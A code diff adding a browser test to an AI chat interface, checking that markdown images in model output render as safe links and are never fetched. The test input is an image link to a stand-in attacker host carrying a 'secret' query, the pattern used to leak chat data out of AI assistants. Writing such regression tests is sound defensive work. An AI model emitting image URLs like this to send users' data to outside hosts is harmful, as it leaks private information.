@@ -203,6 +203,22 @@ test('malformed saved state and HTTP-compatible ID generation do not break chat'
   expect(requests[0].model).toBe('test-model');
 });
 
+test('markdown images in model output render as links and are never fetched', async ({ page }) => {
+  await mockAdmin(page);
+  const fetched: string[] = [];
+  page.on('request', (request) => { if (request.url().startsWith('https://attacker.example/')) fetched.push(request.url()); });
+  await openChat(page);
+  await send(page, 'Look ![leak](https://attacker.example/pixel.png?q=secret)');
+  const history = page.getByLabel('聊天记录');
+  await expect(history.locator('strong').last()).toHaveText('Reply 1');
+  await expect(history.locator('img')).toHaveCount(0);
+  const link = history.getByRole('link', { name: /leak/ });
+  await expect(link).toHaveAttribute('href', 'https://attacker.example/pixel.png?q=secret');
+  await expect(link).toHaveAttribute('rel', 'noopener noreferrer nofollow');
+  await expect(link).toHaveAttribute('target', '_blank');
+  expect(fetched).toEqual([]);
+});
+
 test('restricted workspace uses Auto despite its settings catalog and shows model evidence', async ({ page }) => {
   const { requests } = await mockAdmin(page, { restricted: true });
   await openChat(page);
